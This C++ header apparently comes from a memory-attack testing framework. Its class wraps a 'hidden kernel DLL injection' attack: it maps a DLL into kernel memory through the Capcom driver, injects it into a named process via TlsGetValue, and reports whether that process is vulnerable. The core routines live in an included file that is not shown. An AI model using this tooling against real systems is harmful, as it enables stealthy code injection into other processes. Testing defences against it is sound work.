#pragma once
#include <string>
#include "../../AttackServices/HiddenKernelDLLInjectionAttack/Injector.h"
#include "../AttackProvider/AttackProvider.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

// this class and the attack are completely written inside header files since the attack relies on avoiding page faults
// it therefore locks memory and makes sure that no memory that is used by the capcom driver gets paged out
// using .cpp files counteracts this task
class KernelDLLInjectionProvider : public AttackProvider {
public:
    KernelDLLInjectionProvider(){}
    bool SetTargetDLL(const string _dllPath) {
        wstring dllPath(_dllPath.begin(), _dllPath.end());
        if (!PathFileExistsW(dllPath.c_str())) {
            results += "[-] SetTargetDLL() failed. File not found. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            return FALSE;
        }
        this->dllPath = _dllPath;
        return TRUE;
    }
    bool LoadDLLIntoKernel() {
        if (dllPath == "") {
            results += "[-] LoadDLLIntoKernel() failed. Could not inject DLL. DLL could not be found.\n";
            return FALSE;
        }
        int status = MapDLLIntoKernel(dllPath);
        if (status != 0) {
            results += "[-] InjectDLL() failed. Could not inject DLL. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            if (status == 1) results += "[-] Could not initialize Memory Controller. (Did you run as admin?)\n";
            if (status == 2) results += "[-] Could not get process address of TlsGetValue.\n";
            if (status == 3) results += "[-] Could not map DLL into the kernel.\n";
            return FALSE;
        }
        results += "[+] LoadDLLIntoKernel() was successful.\n[+] Injected ";
        results += this->dllPath;
        results += " into kernel memory space.\n";
        mappedDll = true;
        return TRUE;
    }

    bool InjectDLLIntoTargetProcess(string processName = "") {
        if (processName == "") {
            results += "[-] InjectDLLIntoProcess() failed. Set target process name.\n";
            return FALSE;
        }
        if (!mappedDll) {
            results += "[-] InjectDLLIntoProcess() failed. Map DLL into kernel first.\n";
            return FALSE;
        }

        int status = InjectDLLIntoProcess(processName);
        if (status != 0) {
            results += "[-] InjectDLL() failed. Could not inject DLL. System Error Code: ";
            results += to_string(GetLastError());
            results += "\n";
            if (status == 4) results += "[-] Could not find the target process.\n";
            if (status == 5) results += "[-] Could not find the EProcess of the target process.\n";
            if (status == 6) results += "[-] Could not find a fitting padspace inside the TlsGetValue function.\n";
            if (status == 7) results += "[-] The target process did not call the TlsGetValue function and the attack timed out. (If the target process crashed, run it as administrator.)\n";
            return FALSE;
        }
        Sleep(500); // give the DLL time for the file creation
        TCHAR tempPath[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        lstrcatA(tempPath, "dllInjectionConfirmationFile");
        if (!PathFileExists(tempPath)) {
            results += "[-] InjectDLL() was successful but the confirmation file could not be found.\n";
            results += "[-] This indicates that " ;
            results += processName;
            results += " is vulnerable to DLL injections but the injection failed for other reasons.\n";
            results += "[-] Possible reasons: \n[-] - Process and DLL differ in bit architecture (x86/x64).\n";
            results += "[-] - The DLL could not be found by the target process because the DLL path was not absolute.\n";
            results += "[-] - The DLL has already been injected to the target process.\n";
            results += "[-] - The DLL contains runtime errors.\n";
            return FALSE;
        }
        results += "[+] InjectDLLIntoProcess() was successful.\n[+] ";
        results += processName;
        results += " is vulnerable to the Hidden Kernel DLL Injection Attack.\n";
        if (!DeleteFile(tempPath)) {
            results += "[-] Warning: confirmation file could not be deleted! Make sure to delete it before running further tests. The containing folder is:\n";
            results += tempPath;
            results += "\n";
        }
        return TRUE;
    }
    
    
protected:
    string dllPath = "";
    bool mappedDll = false;
};

